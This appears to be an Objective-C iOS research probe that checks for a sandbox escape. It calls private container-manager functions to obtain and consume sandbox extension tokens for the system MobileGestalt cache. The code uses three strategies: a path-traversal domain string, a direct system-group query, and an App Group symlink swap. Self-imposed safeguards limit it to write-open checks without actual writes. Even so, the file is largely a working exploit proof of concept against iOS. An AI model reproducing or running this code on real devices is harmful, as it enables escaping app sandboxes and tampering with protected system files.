#import "ContainerProbe.h"
#import <TargetConditionals.h>
#import <dlfcn.h>
#import <sys/sysctl.h>
#import <string.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <stdint.h>
#import <stdlib.h>


static NSString *ReadSystemString(const char *key) {
    size_t length = 0;
    if (sysctlbyname(key, NULL, &length, NULL, 0) != 0 || length == 0 || length > 4096) {
        return @"unavailable";
    }
    NSMutableData *data = [NSMutableData dataWithLength:length];
    if (sysctlbyname(key, data.mutableBytes, &length, NULL, 0) != 0) {
        return @"unavailable";
    }
    const char *bytes = data.bytes;
    size_t count = strnlen(bytes, MIN(length, data.length));
    return [[NSString alloc] initWithBytes:bytes length:count encoding:NSUTF8StringEncoding] ?: @"unavailable";
}


// Device-only sandbox-extension test, based on published MCM research.
// Never writes to the target; success requires denied -> allowed -> denied O_WRONLY opens.
typedef void *(*MCMNewQuery)(void);
typedef void (*MCMSetUInt)(void *, uint64_t);
typedef void (*MCMSetIdentifier)(void *, void *);
typedef void (*MCMSetDomain)(void *, const char *);
typedef void *(*MCMGetResult)(void *);
typedef void (*MCMFreeQuery)(void *);
typedef const char *(*MCMObjectPath)(void *);
typedef char *(*MCMGetToken)(void *);
typedef int64_t (*MCMConsumeToken)(const char *);
typedef int (*MCMReleaseToken)(int64_t);
typedef void *(*MCMXPCStringCreate)(const char *);
typedef void (*MCMXPCRelease)(void *);

static int MCMWriteOpenErrno(NSString *path) {
    int descriptor = open(path.fileSystemRepresentation, O_WRONLY | O_CLOEXEC | O_NOFOLLOW);
    if (descriptor >= 0) {
        close(descriptor);
        return 0;
    }
    return errno;
}

static NSString *MCMCanonicalPath(NSString *original) {
    if (!original) return @"";
    NSString *value = original.stringByStandardizingPath;
    if ([value isEqualToString:@"/var"] || [value hasPrefix:@"/var/"]) {
        value = [@"/private" stringByAppendingString:value];
    }
    return value;
}

static NSDictionary *MCMTryStrategy(NSString *name, uint64_t cls,
                                  NSString *ident, BOOL useGroupIdentifier,
                                  NSString * _Nullable domain,
                                  NSString *expectedDirectory,
                                  NSString *targetPlist,
                                  NSString * _Nullable additionalAcceptableDirectory) {
    NSMutableDictionary *report = [NSMutableDictionary dictionaryWithDictionary:@{
        @"name": name, @"querySucceeded": @NO, @"tokenIssued": @NO,
        @"tokenConsumed": @NO, @"writeOpenAfterToken": @NO,
        @"verifiedEscape": @NO, @"systemFilesModified": @NO
    }];
    const int deniedBefore = MCMWriteOpenErrno(targetPlist);
    report[@"baselineWriteOpenErrno"] = @(deniedBefore);
    if (deniedBefore == 0) {
        report[@"status"] = @"baselineAlreadyWritable";
        return report;
    }
    // Do not guess the ABI: require the exact exported entry points.
    void *lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!lib) {
        report[@"status"] = @"libraryUnavailable";
        return report;
    }
    MCMNewQuery queryCreate = (MCMNewQuery)dlsym(lib, "container_query_create");
    MCMSetUInt setClass = (MCMSetUInt)dlsym(lib, "container_query_set_class");
    MCMSetIdentifier setIDs = (MCMSetIdentifier)dlsym(lib,
        useGroupIdentifier ? "container_query_set_group_identifiers" : "container_query_set_identifiers");
    MCMSetUInt setFlags = (MCMSetUInt)dlsym(lib, "container_query_operation_set_flags");
    MCMSetUInt setPart = (MCMSetUInt)dlsym(lib, "container_query_operation_set_part");
    MCMSetDomain setDomain = (MCMSetDomain)dlsym(lib, "container_query_operation_set_part_domain");
    MCMGetResult getResult = (MCMGetResult)dlsym(lib, "container_query_get_single_result");
    MCMFreeQuery freeQuery = (MCMFreeQuery)dlsym(lib, "container_query_free");
    MCMObjectPath getPath = (MCMObjectPath)dlsym(lib, "container_object_get_path");
    MCMGetToken copyToken = (MCMGetToken)dlsym(lib, "container_copy_sandbox_token");
    MCMConsumeToken consumeToken = (MCMConsumeToken)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    MCMReleaseToken releaseToken = (MCMReleaseToken)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    MCMXPCStringCreate makeXPCString = (MCMXPCStringCreate)dlsym(RTLD_DEFAULT, "xpc_string_create");
    MCMXPCRelease releaseXPC = (MCMXPCRelease)dlsym(RTLD_DEFAULT, "xpc_release");
    if (!queryCreate || !setClass || !setIDs || !setFlags || !setPart || !getResult ||
        !freeQuery || !getPath || !copyToken || !consumeToken || !releaseToken ||
        !makeXPCString || (domain && !setDomain)) {
        report[@"status"] = @"requiredSymbolsMissing";
        dlclose(lib);
        return report;
    }
    void *query = queryCreate();
    if (!query) {
        report[@"status"] = @"queryAllocationFailed";
        dlclose(lib);
        return report;
    }
    void *identifier = makeXPCString(ident.UTF8String);
    if (!identifier) {
        report[@"status"] = @"identifierAllocationFailed";
        freeQuery(query);
        dlclose(lib);
        return report;
    }
    setClass(query, cls);
    setIDs(query, identifier);
    setPart(query, 3);
    setFlags(query, UINT64_C(0x8100000000));
    if (domain) setDomain(query, domain.UTF8String);

    void *result = getResult(query);
    if (!result) {
        report[@"status"] = @"queryRejected";
    } else {
        report[@"querySucceeded"] = @YES;
        const char *untrustedPath = getPath(result);
        NSString *normalized = MCMCanonicalPath(untrustedPath ? [NSString stringWithUTF8String:untrustedPath] : nil);
        BOOL exactPath = [normalized isEqualToString:expectedDirectory] ||
            (additionalAcceptableDirectory && [normalized isEqualToString:additionalAcceptableDirectory]);
        report[@"resolvedTargetMatches"] = @(exactPath);
        if (!exactPath) {
            report[@"status"] = @"queryReturnedUnexpectedPath";
        } else {
            char *token = copyToken(result);
            if (!token || !*token) {
                report[@"status"] = @"noSandboxToken";
            } else {
                report[@"tokenIssued"] = @YES;
                int64_t handle = consumeToken(token);
                if (handle < 0) {
                    report[@"status"] = @"tokenConsumptionFailed";
                } else {
                    report[@"tokenConsumed"] = @YES;
                    const int withToken = MCMWriteOpenErrno(targetPlist);
                    report[@"writeOpenWithTokenErrno"] = @(withToken);
                    report[@"writeOpenAfterToken"] = @(withToken == 0);
                    releaseToken(handle);
                    const int afterRelease = MCMWriteOpenErrno(targetPlist);
                    report[@"writeOpenAfterReleaseErrno"] = @(afterRelease);
                    BOOL escape = deniedBefore != 0 && withToken == 0 && afterRelease != 0;
                    report[@"verifiedEscape"] = @(escape);
                    report[@"status"] = escape ? @"sandboxEscapeVerified" :
                        (withToken == 0 ? @"writeOpenDidNotRevoke" : @"tokenDidNotGrantWriteOpen");
                }
            }
            if (token) free(token);
        }
    }
    freeQuery(query);
    if (releaseXPC) releaseXPC(identifier);
    dlclose(lib);
    return report;
}


// Requires a dedicated, correctly signed App Group; never touches another app's caches.
static NSString *A16DedicatedGroup(void) {
    const char *securityPath = "/System/Library/Frameworks/Security.framework/Security";
    void *security = dlopen(securityPath, RTLD_NOW | RTLD_LOCAL);
    if (!security) return nil;
    CFTypeRef (*createSelf)(CFAllocatorRef) = dlsym(security, "SecTaskCreateFromSelf");
    CFTypeRef (*copyEntitlement)(CFTypeRef, CFStringRef, CFErrorRef *) =
        dlsym(security, "SecTaskCopyValueForEntitlement");
    if (!createSelf || !copyEntitlement) {
        dlclose(security);
        return nil;
    }
    CFTypeRef task = createSelf(kCFAllocatorDefault);
    if (!task) { dlclose(security); return nil; }
    CFTypeRef groups = copyEntitlement(task, CFSTR("com.apple.security.application-groups"), NULL);
    CFRelease(task);
    NSString *found = nil;
    if (groups && CFGetTypeID(groups) == CFArrayGetTypeID()) {
        for (id group in (__bridge NSArray *)groups) {
            if ([group isKindOfClass:NSString.class] &&
                [group isEqualToString:@"group.org.a16probe.research"]) {
                found = @"group.org.a16probe.research";
                break;
            }
        }
    }
    if (groups) CFRelease(groups);
    dlclose(security);
    return found;
}

static NSDictionary *MCMRunDedicatedGroupTrial(NSString *targetDirectory, NSString *targetPlist) {
    NSMutableDictionary *summary = [@{
        @"name": @"class7-dedicated-appgroup-symlink",
        @"status": @"notAttempted",
        @"entitlementRequired": @"group.org.a16probe.research",
        @"querySucceeded": @NO, @"tokenIssued": @NO,
        @"tokenConsumed": @NO, @"verifiedEscape": @NO,
        @"systemFilesModified": @NO
    } mutableCopy];
    NSString *group = A16DedicatedGroup();
    if (!group) {
        summary[@"status"] = @"missingDedicatedAppGroupEntitlement";
        summary[@"interpretation"] = @"The signed running app lacks the dedicated group; no test of class 7 occurred.";
        return summary;
    }
    NSURL *groupURL = [NSFileManager.defaultManager containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupURL) {
        summary[@"status"] = @"dedicatedAppGroupContainerUnavailable";
        return summary;
    }
    NSFileManager *fm = NSFileManager.defaultManager;
    NSURL *library = [groupURL URLByAppendingPathComponent:@"Library" isDirectory:YES];
    NSURL *caches = [library URLByAppendingPathComponent:@"Caches" isDirectory:YES];
    NSURL *backup = [library URLByAppendingPathComponent:@".A16ProbeCachesRecovery" isDirectory:YES];
    NSError *error = nil;
    if (![fm createDirectoryAtURL:library withIntermediateDirectories:YES attributes:nil error:&error]) {
        summary[@"status"] = @"groupLibraryCreationFailed";
        summary[@"error"] = error.localizedDescription ?: @"unknown";
        return summary;
    }
    // Crash recovery. An existing backup is never overwritten.
    BOOL backupExists = [fm fileExistsAtPath:backup.path];
    if (backupExists) {
        NSDictionary *attrs = [fm attributesOfItemAtPath:caches.path error:nil];
        BOOL cachesPresent = [fm fileExistsAtPath:caches.path];
        if (cachesPresent) {
            NSDictionary *existing = [fm attributesOfItemAtPath:caches.path error:nil];
            if ([existing[NSFileType] isEqual:NSFileTypeSymbolicLink]) {
                NSString *dest = [fm destinationOfSymbolicLinkAtPath:caches.path error:nil];
                if ([MCMCanonicalPath(dest) isEqualToString:targetDirectory]) {
                    if (![fm removeItemAtURL:caches error:&error]) {
                        summary[@"status"] = @"recoverySymlinkCleanupFailed";
                        summary[@"error"] = error.localizedDescription ?: @"unknown";
                        return summary;
                    }
                    cachesPresent = NO;
                }
            }
        }
        if (cachesPresent) {
            summary[@"status"] = @"recoveryConflictNeedsManualReview";
            return summary;
        }
        if (![fm moveItemAtURL:backup toURL:caches error:&error]) {
            summary[@"status"] = @"recoveryFailed";
            summary[@"error"] = error.localizedDescription ?: @"unknown";
            return summary;
        }
        summary[@"previousCacheRecovered"] = @YES;
    }
    BOOL originalExists = [fm fileExistsAtPath:caches.path];
    // Never follow or replace an existing symlink from earlier, untrusted state.
    NSDictionary *originalInfo = [fm attributesOfItemAtPath:caches.path error:nil];
    if ([originalInfo[NSFileType] isEqual:NSFileTypeSymbolicLink]) {
        summary[@"status"] = @"unexpectedExistingSymlink";
        return summary;
    }
    BOOL backupMoved = NO;
    BOOL symlinkCreated = NO;
    @try {
        if (originalExists) {
            if (![fm moveItemAtURL:caches toURL:backup error:&error]) {
                summary[@"status"] = @"cacheBackupFailed";
                summary[@"error"] = error.localizedDescription ?: @"unknown";
                return summary;
            }
            backupMoved = YES;
        }
        if (![fm createSymbolicLinkAtURL:caches
                      withDestinationURL:[NSURL fileURLWithPath:targetDirectory]
                                   error:&error]) {
            summary[@"status"] = @"symlinkCreationFailed";
            summary[@"error"] = error.localizedDescription ?: @"unknown";
            return summary;
        }
        symlinkCreated = YES;
        NSDictionary *trial = MCMTryStrategy(@"class7-dedicated-appgroup-symlink", 7, group, YES,
            nil, targetDirectory, targetPlist, caches.path);
        [summary addEntriesFromDictionary:trial];
    } @finally {
        BOOL cleanupGood = YES;
        if (symlinkCreated) {
            NSError *removeErr = nil;
            NSDictionary *linkInfo = [fm attributesOfItemAtPath:caches.path error:nil];
            if ([linkInfo[NSFileType] isEqual:NSFileTypeSymbolicLink]) {
                if (![fm removeItemAtURL:caches error:&removeErr]) cleanupGood = NO;
            } else {
                cleanupGood = NO; // Never remove a directory that another process created.
            }
        }
        if (backupMoved) {
            NSError *restoreErr = nil;
            if (![fm fileExistsAtPath:caches.path]) {
                if (![fm moveItemAtURL:backup toURL:caches error:&restoreErr]) cleanupGood = NO;
            } else cleanupGood = NO;
        }
        summary[@"appGroupCacheRestored"] = @(cleanupGood);
    }
    return summary;
}

@implementation ContainerProbe
+ (NSDictionary<NSString *, id> *)snapshot {
    // RTLD_NOLOAD refuses to map a new library or run its initializers.
    // An unavailable handle is inconclusive, including on the simulator.
    const char *image = "/usr/lib/system/libsystem_containermanager.dylib";
    dlerror();
    void *handle = dlopen(image, RTLD_NOW | RTLD_LOCAL | RTLD_NOLOAD);
    const char *loadError = dlerror();
    NSString *imageError = loadError ? [NSString stringWithUTF8String:loadError] : @"";
    NSArray<NSString *> *names = @[
        @"container_query_create", @"container_query_set_class",
        @"container_query_set_group_identifiers", @"container_query_operation_set_flags",
        @"container_query_operation_set_part", @"container_query_get_single_result",
        @"container_query_free", @"container_copy_sandbox_token",
        @"sandbox_extension_consume", @"sandbox_extension_release"
    ];
    NSMutableArray<NSDictionary *> *symbols = [NSMutableArray array];
    for (NSString *name in names) {
        BOOL extension = [name hasPrefix:@"sandbox_extension_"];
        void *scope = extension ? RTLD_DEFAULT : handle;
        if (!extension && !handle) {
            [symbols addObject:@{@"name": name, @"status": @"notChecked",
                                 @"reason": @"imageNotAlreadyLoaded", @"invoked": @NO}];
            continue;
        }
        dlerror();
        void *address = dlsym(scope, name.UTF8String);
        const char *symbolError = dlerror();
        BOOL visible = address != NULL && symbolError == NULL;
        // Never cast this address to a function pointer, invoke it, or log the address.
        [symbols addObject:@{@"name": name, @"status": visible ? @"visible" : @"notVisible",
                             @"scope": extension ? @"RTLD_DEFAULT" : @"alreadyLoadedImage",
                             @"reason": visible ? @"resolvedOnly" : @"notVisibleInSelectedScope",
                             @"invoked": @NO}];
    }
    if (handle) { dlclose(handle); }
    NSFileManager *manager = NSFileManager.defaultManager;
    NSArray *publicAPIs = @[
        @{@"name": @"NSFileManager.URLsForDirectory:inDomains:",
          @"available": @([manager respondsToSelector:@selector(URLsForDirectory:inDomains:)])},
        @{@"name": @"NSFileManager.containerURLForSecurityApplicationGroupIdentifier:",
          @"available": @([manager respondsToSelector:@selector(containerURLForSecurityApplicationGroupIdentifier:)])},
        @{@"name": @"NSJSONSerialization.dataWithJSONObject:options:error:",
          @"available": @([NSJSONSerialization respondsToSelector:@selector(dataWithJSONObject:options:error:)])}
    ];
    return @{
        @"hardwareIdentifier": ReadSystemString("hw.machine"),
        @"osBuild": ReadSystemString("kern.osversion"),
        @"simulator": @(TARGET_OS_SIMULATOR != 0),
        @"containerManager": @{@"mode": @"alreadyLoadedImagesOnly",
                               @"imageAlreadyLoaded": @(handle != NULL),
                               @"loaderDiagnostic": imageError ?: @"",
                               @"symbols": symbols},
        @"publicAPIs": publicAPIs,
        @"privateAPIsInvoked": @NO,
        @"containerQueriesSent": @NO,
        @"sandboxExtensionsConsumed": @NO,
        @"appGroupLookupPerformed": @NO
    };
}

+ (NSDictionary<NSString *, id> *)runEscapeTrial {
    NSString *root = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    NSString *plist = [root stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    NSString *geodDomain = @"../../../../../../containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    // Both requests are independent of App Group entitlement, unlike class-7 part symlinks.
    // Private ABI may change in future betas. Run only by explicit user action.
    NSDictionary *geod = MCMTryStrategy(@"class12-geod-partDomain", 12,
        @"com.apple.geod", NO, geodDomain, root, plist, nil);
    NSDictionary *direct = MCMTryStrategy(@"class13-mobilegestalt-direct", 13,
        @"systemgroup.com.apple.mobilegestaltcache", YES, nil, root, plist, nil);
    NSDictionary *class7 = MCMRunDedicatedGroupTrial(root, plist);
    BOOL success = [geod[@"verifiedEscape"] boolValue] ||
        [direct[@"verifiedEscape"] boolValue] || ([class7[@"verifiedEscape"] boolValue] && [class7[@"appGroupCacheRestored"] boolValue]);
    return @{
        @"status": success ? @"sandboxEscapeVerified" : @"noSandboxEscapeVerified",
        @"strategies": @[geod, direct, class7],
        @"testedBuild": ReadSystemString("kern.osversion"),
        @"systemFilesModified": @NO,
        @"interpretation": @"Only denied->allowed->denied O_WRONLY open after a consumed sandbox extension qualifies as verified. Dedicated App Group cache restoration must also succeed. No system write is attempted. Runtime crash is possible if Apple changes private ABI."
    };
}

@end
